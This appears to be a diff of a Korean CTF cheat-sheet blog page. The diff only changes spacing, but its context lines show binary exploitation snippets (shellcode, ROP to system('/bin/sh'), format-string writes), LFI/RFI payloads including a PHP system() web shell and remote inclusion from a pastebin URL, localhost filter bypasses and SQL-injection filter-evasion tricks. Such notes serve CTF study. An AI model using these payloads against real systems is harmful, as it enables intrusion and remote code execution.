@@ -9,15 +9,13 @@ sitemap :
   priority : 1.0
 ---
 
-
-
 # Binary Tips
 
 ```
 file 명령어로 봤을 때 stripped 돼있고 main 함수가 안 보인다면 start로 가면 libc_start_main으로 콜하는 데 그 중에서 첫번째 인자로 들어가는 주소가 main함수이다.
 ```
 
-
+<br />
 
 > pwntools Create Shellcode 
 
@@ -25,7 +23,7 @@ file 명령어로 봤을 때 stripped 돼있고 main 함수가 안 보인다면 
 asm(shellcraft.amd64.sh(), arch='amd64')
 ```
 
-
+<br />
 
 > pwntools libc symbol
 
@@ -34,7 +32,7 @@ leak_libc = ELF('./leak_libc')
 libc_system = libc_base_addr + leak_libc.symbols['system']
 ```
 
-
+<br />
 
 > 64 bit ROP
 
@@ -42,7 +40,7 @@ libc_system = libc_base_addr + leak_libc.symbols['system']
 [buf] +  gadget [pop rdi; ret] + [/bin/sh string addr] + [system addr]
 ```
 
-
+<br />
 
 > Function Offset 
 
@@ -57,7 +55,7 @@ binsh = libc_base
 binsh += e.search('/bin/sh').next()
 ```
 
-
+<br />
 
 > FSB
 
@@ -77,7 +75,7 @@ printf("%LENGTH$08x"); -> printf("%1337$08x");
 printf("%LENGTH$n"); -> printf("%12$n");
 ```
 
-
+<br />
 
 # Python Tips
 
@@ -99,7 +97,7 @@ for x,y in zip(a,cycle(b)):
 print flag
 ```
 
-
+<br />
 
 # Web Tips
 
@@ -117,7 +115,7 @@ head={'user-agent': 'Test'}
 req = requests.get(ADDRESS, headers=head)
 ```
 
-
+<br />
 
 > Use cURL
 
@@ -129,7 +127,7 @@ curl -d "id=admin&pw=admin&press=Login" ADDRESS
 curl ADDRESS -H 'header: header' --data 'data=data'
 ```
 
-
+<br />
 
 > LFI & RFI
 
@@ -143,7 +141,7 @@ http://URL/?page=data://text/plain,%3Cxmp%3E%3C?php%20system($_GET[%27x%27]);&x=
 http://URL/?page=http://pastebin.com/raw/abcd/?&x=ls%20-al
 ```
 
-
+<br />
 
 > 127.0.0.1
 
@@ -159,7 +157,7 @@ http://017700000001
 http://0177.000.000.01
 ```
 
-
+<br />
 
 > MySQL
 
@@ -176,7 +174,7 @@ if ord Function Filtering : conv(hex(substr(pw,1,1)),16,10)
 IF(substr(lpad(bin(ord(substr(password,1,1))),8,0),1,1)
 ```
 
-
+<br />
 
 > SQLI
 
@@ -188,7 +186,7 @@ admin : 0x61646d696e
   			char(0x61, 0x64, 0x6d, 0x69, 0x6e)
 ```
 
-
+<br />
 
 Blind SQL Injection Equal(=) Filltering
 
@@ -198,7 +196,7 @@ if(strcmp(substr('abc',1,1),'a'),0,1)
 substr('abc',1,1)%20in('a')
 ```
 
-
+<br />
 
 substr Filtering
 
@@ -207,7 +205,7 @@ right(left('abc',1),1)
 id > 0x41444d4941 'ADMIN' > 'ADMIA'(hex)
 ```
 
-
+<br />
 
 ereg, eregi
 
@@ -216,7 +214,7 @@ ereg, eregi
 FRONT %00 INSERT -> 뒤에 문자 필터링 처리 안됨
 ```
 
-
+<br />
 
 replace, replaceAll, str_replace
 
@@ -226,7 +224,7 @@ replace, replaceAll, str_replace
 										 'admdmiadmdmiinin'
 ```
 
-
+<br />
 
 Numeric Character Filtering
 
@@ -235,7 +233,7 @@ Numeric Character Filtering
 1 -> '!'='!' -> true
 ```
 
-
+<br />
 
 White Space Filtering (%20)
 
@@ -243,7 +241,7 @@ White Space Filtering (%20)
 %20 -> %0a %0b %0c %0d %09
 ```
 
-
+<br />
 
 Single Quoter Filtering (%27)
 
@@ -254,7 +252,7 @@ if '\' not Filtering
 parameter : id=\&pw=%20or%201%23
 ```
 
-
+<br />
 
 Comment Injection
 
@@ -265,5 +263,5 @@ Comment Injection
 -> select test1 from TABLE where id='abc'/* and pw=''*/ or id='admin'%23
 ```
 
-
+<br />
 
